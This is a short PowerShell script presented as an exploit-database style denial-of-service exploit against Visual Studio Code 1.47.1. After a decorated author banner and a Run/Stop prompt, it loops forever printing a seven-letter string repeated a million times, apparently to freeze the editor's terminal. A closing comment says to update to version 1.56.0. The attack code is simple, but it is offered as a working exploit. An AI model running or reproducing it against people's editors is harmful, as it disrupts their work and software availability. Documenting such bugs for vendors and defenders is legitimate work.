#[+]. Author: H.H.A.Ravindu Priyankara
#[+]. Exploit Tittle: Visual Studio Code (VS Code) Denial of Service 
#[+]. Date: 18-10-2021
#[+]. Category: Denial of Service(DOS)
#[+]. Tested Version:1.47.1
#[+]. Vendor:Microsoft
#[+]. Software Download Link:https://code.visualstudio.com/updates/
#[+]. Script Download Link: https://github.com/Ravindu-Priyankara/vscode_1.47.1
#[+]. E-Mail: h.h.a.r.p.premachandra@gmail.com

Write-Host "
  *                                                                                                           *
    *-------------------------------------------------------------------------------------------------------*
    |                                                                                                       |
    |" -ForegroundColor Yellow -NoNewline; Write-Host " Exploit Tittle :-" -ForegroundColor Green -NoNewline; Write-Host "  Visual Studio Code (VS Code) Denial of Service               " -ForegroundColor Cyan -NoNewline; Write-Host "                      |
    |                                                                                                       |
    |" -ForegroundColor Yellow -NoNewline; Write-Host " Author         :-" -ForegroundColor Green -NoNewline; Write-Host "  H.H.A.Ravindu.Priyankara  " -ForegroundColor Cyan -NoNewline; Write-Host "                                                         |
    |                                                                                                       |
    |" -ForegroundColor Yellow -NoNewline; Write-Host " Github         :-" -ForegroundColor Green -NoNewline; Write-Host "  https://github.com/Ravindu-Priyankara " -ForegroundColor Cyan -NoNewline; Write-Host "                                             |
    |                                                                                                       |
    |" -ForegroundColor Yellow -NoNewline; Write-Host " Youtube        :-"-ForegroundColor Green -NoNewline; Write-Host "  https://www.youtube.com/channel/UCKD2j5Mbr15RKaXBSIXwvMQ " -ForegroundColor Cyan -NoNewline; Write-Host "                          |
    |                                                                                                       |
    |" -ForegroundColor Yellow -NoNewline; Write-Host " Linkedin       :-"-ForegroundColor Green -NoNewline; Write-Host "  https://www.linkedin.com/in/ravindu-priyankara-b77753209/ " -ForegroundColor Cyan -NoNewline; Write-Host "                         |
    *-------------------------------------------------------------------------------------------------------*"-ForegroundColor Yellow 

[string]$Userinpts = Read-Host -Prompt "Enter Run or Stop:-"
if ($Userinpts -eq "Run") {
    Write-Output "Yeah I Know"
    while ($True) {
        $name = "AAAAAAA"
        $name * 1000000
    }
    #or
    #$name = "AAAAAAA"
    #$name * 1000000
}
if ($Userinpts -eq "Stop") {
    exit
}

#==========================================================
#==================== solution ============================ 
#==========================================================

#Update Your Visual Studio Code Application
#    1.47.1 version ==> 1.56.0 version

#==========================================================
